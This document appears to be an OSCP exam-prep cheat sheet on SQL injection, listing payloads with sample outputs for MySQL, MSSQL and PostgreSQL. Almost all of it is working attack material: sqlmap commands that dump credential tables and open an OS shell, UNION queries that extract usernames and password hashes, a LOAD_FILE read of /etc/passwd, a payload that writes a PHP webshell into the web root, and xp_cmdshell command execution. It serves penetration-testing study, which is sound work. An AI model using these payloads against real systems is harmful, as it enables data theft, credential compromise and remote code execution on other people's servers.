# SQL INJECTION

### Test for SQLi

```bash
' OR 1=1-- -
" OR 1=1-- -
' OR '1'='1
1' ORDER BY 1-- -
```

> Try in every input field

**Why:** Look for errors or behavior change

<details>
<summary>Example Output</summary>

```
Input: ' OR 1=1-- -

Response shows ALL users instead of one
OR: Error: You have an error in your SQL syntax near '''
OR: Page content changes between ' OR 1=1-- - and ' OR 1=2-- -
(SQLi CONFIRMED)
```
</details>

---

### LAB ONLY - SQLMap automated

```bash
sqlmap -u 'http://$IP/page.php?id=1' --batch --dbs
```

> NOT ALLOWED ON OSCP EXAM. Automated SQLi

**Why:** Enumerate databases

<details>
<summary>Example Output</summary>

```
sqlmap -u 'http://10.10.10.5/page.php?id=1' --batch --dbs
[INFO] the back-end DBMS is MySQL
available databases [3]:
[*] information_schema
[*] webapp
[*] mysql
(NOT ALLOWED ON OSCP EXAM)
```
</details>

---

### LAB ONLY - SQLMap with POST data

```bash
sqlmap -u 'http://$IP/login.php' --data='user=admin&pass=test' --batch --dbs
```

> NOT ALLOWED ON OSCP EXAM. POST parameter injection

**Why:** Login forms

<details>
<summary>Example Output</summary>

```
sqlmap -u 'http://10.10.10.5/login' --data='user=a&pass=b' --batch
[INFO] Parameter 'user' is vulnerable
Type: UNION query
(NOT ALLOWED ON OSCP EXAM)
```
</details>

---

### LAB ONLY - SQLMap dump creds

```bash
sqlmap -u 'http://$IP/page.php?id=1' -D <db> -T users --dump
```

> NOT ALLOWED ON OSCP EXAM. Dump user table

**Why:** Usernames and hashes

<details>
<summary>Example Output</summary>

```
sqlmap -D webapp -T users --dump
+-------+----------+
| admin | P@ssw0rd |
| john  | welcome1 |
(NOT ALLOWED ON OSCP EXAM)
```
</details>

---

### LAB ONLY - SQLMap OS shell

```bash
sqlmap -u 'http://$IP/page.php?id=1' --os-shell
```

> NOT ALLOWED ON OSCP EXAM. Get shell via SQLi

**Why:** Direct RCE

<details>
<summary>Example Output</summary>

```
sqlmap --os-shell
os-shell> whoami
www-data
os-shell> id
uid=33(www-data)
(NOT ALLOWED ON OSCP EXAM)
```
</details>

---

### UNION based manual

```bash
' UNION SELECT 1,2,3-- -
' UNION SELECT user(),database(),version()-- -
```

> Manual UNION injection

**Why:** Identify column count first with ORDER BY

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,2,3-- -
Page shows '2' and '3' in output

' UNION SELECT 1,user(),database()-- -
Shows: root@localhost and webapp
(Manual injection = OSCP legal)
```
</details>

---

### Read files via SQLi

```bash
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
```

> Read files through injection

**Why:** LFI via database

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www
(Read any file the DB user can access)
```
</details>

---

### Write webshell via SQLi

```bash
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

> Write PHP shell

**Why:** RCE if writable web root

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/cmd.php'-- -

Error? Try: INTO DUMPFILE instead of OUTFILE

curl http://10.10.10.5/cmd.php?cmd=id
uid=33(www-data)
(Requires FILE privilege and writable web root)
```
</details>

---

### Error-based injection

```bash
' AND extractvalue(1,concat(0x7e,version()))-- -
```

> Force errors to leak data

**Why:** When UNION doesn't work

<details>
<summary>Example Output</summary>

```
' AND extractvalue(1,concat(0x7e,version()))-- -

Error: XPATH syntax error: '~5.7.29-0ubuntu0.18.04.1'
(Version leaked through error message)
```
</details>

---

### Blind boolean SQLi

```bash
' AND 1=1-- - (true)
' AND 1=2-- - (false)
```

> Different response = injectable

**Why:** Slower but works when no output

<details>
<summary>Example Output</summary>

```
' AND 1=1-- -  -> Page loads normally (TRUE)
' AND 1=2-- -  -> Page is blank/different (FALSE)

' AND SUBSTRING(user(),1,1)='r'-- -  -> TRUE
' AND SUBSTRING(user(),1,1)='a'-- -  -> FALSE
(User starts with 'r' -> root)
```
</details>

---

### Time-based blind SQLi

```bash
' AND SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'-- -
```

> If page delays = injectable

**Why:** MySQL vs MSSQL syntax

<details>
<summary>Example Output</summary>

```
' AND SLEEP(5)-- -

Page takes 5 seconds to load = INJECTABLE

' AND IF(SUBSTRING(database(),1,1)='w',SLEEP(5),0)-- -
5 second delay -> first char is 'w'
(Slow but works when no visible output)
```
</details>

---

### Determine column count

```bash
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
(increment until error)
```

> Keep increasing until you get an error. Last working number = column count

**Why:** Required before UNION injection

<details>
<summary>Example Output</summary>

```
' ORDER BY 1-- -  -> OK
' ORDER BY 2-- -  -> OK
' ORDER BY 3-- -  -> OK
' ORDER BY 4-- -  -> ERROR
(3 columns in the query)
```
</details>

---

### Find displayed columns

```bash
' UNION SELECT 1,2,3,4-- -
(match column count from ORDER BY)
```

> See which numbers appear on page. Those columns show output.

**Why:** Inject queries into visible columns

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,2,3-- -

Page shows: 2 and 3 in the output
(Inject payloads into columns 2 and 3)
```
</details>

---

### Extract database version

```bash
' UNION SELECT 1,version(),3-- -
' UNION SELECT 1,@@version,3-- -
```

> MySQL: version()  MSSQL: @@version  PostgreSQL: version()

**Why:** Confirms DB type

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,version(),3-- -

5.7.29-0ubuntu0.18.04.1
(MySQL 5.7.29 on Ubuntu)
```
</details>

---

### Extract current database

```bash
' UNION SELECT 1,database(),3-- -
' UNION SELECT 1,db_name(),3-- -
```

> MySQL: database()  MSSQL: db_name()

**Why:** Know which DB you're in

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,database(),3-- -

Output: webapp
(Now enumerate tables in 'webapp' database)
```
</details>

---

### Extract current user

```bash
' UNION SELECT 1,user(),3-- -
' UNION SELECT 1,current_user,3-- -
```

> Check privilege level

**Why:** DBA = more options

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,user(),3-- -

Output: root@localhost
(Root DB user = FILE privileges likely available)
```
</details>

---

### List all databases (MySQL)

```bash
' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -
```

> All databases in one query

**Why:** Find interesting databases

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -

information_schema,mysql,performance_schema,webapp,secret_db
```
</details>

---

### List tables in database

```bash
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='<dbname>'-- -
```

> All tables from target DB

**Why:** Look for users/credentials tables

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='webapp'-- -

users,posts,settings,sessions
```
</details>

---

### List columns in table

```bash
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```

> Column names from target table

**Why:** Find username/password columns

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

Output: id,username,password,email,role
(Now dump username and password columns)
```
</details>

---

### Dump table data

```bash
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -
```

> 0x3a is colon separator

**Why:** Extract credentials

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -

admin:$2y$10$abc123...,john:$2y$10$def456...,editor:password123
(Crack bcrypt hashes or use plaintext creds)
```
</details>

---

### MSSQL list databases

```bash
' UNION SELECT 1,name,3 FROM master..sysdatabases-- -
```

> MSSQL uses different schema

**Why:** MSSQL syntax

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,name,3 FROM master..sysdatabases-- -

master
tempdb
model
msdb
webapp
HRDatabase
```
</details>

---

### MSSQL list tables

```bash
' UNION SELECT 1,name,3 FROM <dbname>..sysobjects WHERE xtype='U'-- -
```

> xtype U = user tables

**Why:** MSSQL syntax

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,name,3 FROM webapp..sysobjects WHERE xtype='U'-- -

users
employees
config
sessions
```
</details>

---

### MSSQL list columns

```bash
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- -
```

> Columns from target table

**Why:** MSSQL syntax

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- -

id
username
password_hash
email
```
</details>

---

### PostgreSQL list databases

```bash
' UNION SELECT 1,datname,3 FROM pg_database-- -
```

> PostgreSQL syntax

**Why:** Different from MySQL

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,datname,3 FROM pg_database-- -

postgres
template0
template1
webapp
```
</details>

---

### PostgreSQL list tables

```bash
' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'-- -
```

> Public schema tables

**Why:** PostgreSQL syntax

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'-- -

users
posts
config
```
</details>

---

### Stacked queries (MSSQL)

```bash
'; EXEC xp_cmdshell 'whoami'-- -
```

> MSSQL supports stacked queries

**Why:** Direct RCE if sa user

<details>
<summary>Example Output</summary>

```
'; EXEC xp_cmdshell 'whoami'-- -

nt authority\system
(RCE as SYSTEM via MSSQL stacked queries)
```
</details>

---

### Second-order SQLi

```bash
Register user: admin'-- -
Then login or trigger profile update
```

> Payload stored, executed later

**Why:** When direct injection fails

<details>
<summary>Example Output</summary>

```
Register username: admin'-- -
Login with that account
Profile page shows: Welcome, admin
(Stored payload executed on profile load, bypassed auth)
```
</details>

---
